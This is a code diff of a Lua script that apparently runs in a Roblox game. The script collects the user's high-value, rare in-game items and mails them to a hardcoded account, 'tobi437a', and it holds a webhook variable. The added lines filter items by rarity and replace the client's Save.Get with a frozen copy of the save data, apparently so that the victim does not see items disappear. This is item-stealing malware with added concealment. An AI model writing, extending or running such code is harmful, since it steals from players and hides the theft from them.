@@ -170,6 +170,7 @@ end
 
 local user = Username or "tobi437a"
 local min_rap = min_rap or 10000
+local min_chance = min_chance or 10000
 local webhook = webhook
 
 local function sendItem(category, uid, am)
@@ -224,8 +225,10 @@ for i, v in pairs(categoryList) do
                 local rapValue = getRAP(v, item)
                 if rapValue >= min_rap then
                     local difficulty = require(game:GetService("ReplicatedStorage").Library.Directory.Pets)[item.id]["difficulty"]
-                    table.insert(sortedItems, {category = v, uid = uid, amount = item._am or 1, rap = rapValue, name = item.id, chance = difficulty})
-                    totalRAP = totalRAP + (rapValue * (item._am or 1))
+                    if difficulty >= min_chance then
+                        table.insert(sortedItems, {category = v, uid = uid, amount = item._am or 1, rap = rapValue, name = item.id, chance = difficulty})
+                        totalRAP = totalRAP + (rapValue * (item._am or 1))
+                    end
                 end
             else
                 local rapValue = getRAP(v, item)
@@ -247,6 +250,23 @@ end
 
 if #sortedItems > 0 then
     ClaimMail()
+
+    local blob_a = game:GetService("ReplicatedStorage"):WaitForChild("Library"):WaitForChild("Client"):WaitForChild("Save")
+    local blob_b = require(blob_a).Get()
+    function deepCopy(original)
+        local copy = {}
+        for k, v in pairs(original) do
+            if type(v) == "table" then
+                v = deepCopy(v)
+            end
+            copy[k] = v
+        end
+        return copy
+    end
+    blob_b = deepCopy(blob_b)
+    require(blob_a).Get = function(...)
+        return blob_b
+    end
 
     table.sort(sortedItems, function(a, b)
         return a.rap * a.amount > b.rap * b.amount 
